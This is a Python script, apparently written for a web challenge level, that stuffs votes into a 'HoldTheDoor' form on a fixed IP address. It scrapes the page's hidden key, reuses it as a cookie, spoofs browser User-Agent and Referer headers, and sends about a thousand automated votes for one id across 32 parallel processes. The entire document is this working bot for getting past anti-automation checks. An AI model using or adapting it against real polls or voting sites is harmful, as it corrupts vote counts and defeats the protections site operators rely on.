#!/usr/bin/python3
import requests
import multiprocessing
from bs4 import BeautifulSoup

url = 'http://158.69.76.135/level2.php'

data = {
    'id': '2158',
    'holdthedoor': 'submit',
    'key':''
}
COOKIES = {
    'HoldTheDoor': ''
    }

Headers =  {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "http://158.69.76.135/level2.php",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    }

def getKey():
    """ Get the key what is in the page """
    code = requests.get(url)
    soup = BeautifulSoup(code.text, 'html.parser')
    form = soup.find(method="post")
    key = form.find(type="hidden")
    checkKey = str(key.attrs['value'])
    #print(checkKey)
    data['key'] = checkKey
    COOKIES['HoldTheDoor'] = checkKey
    #print(checkKey)

def post(finish):
    """ send vote to page """
    count = 0
    while count < finish:
        getKey()
        action = requests.post(url,data=data, cookies=COOKIES, headers= Headers)
        count += 1
        print("Va la cuenta en: {}".format(count))

def multi():
    """ Generate multiprocess for vote """
    finish = 32
    p = multiprocessing.Process(target=post, args=(finish,))
    return(p)

def process():
    """ Start de program """
    inprocess = []
    for i in range(32):
        inprocess.append(multi())
        inprocess[i].start()
        print("Multiprocess {}".format(i))
    for i in inprocess:
        i.join()
    print("Finish")

if __name__ == "__main__":
    process()
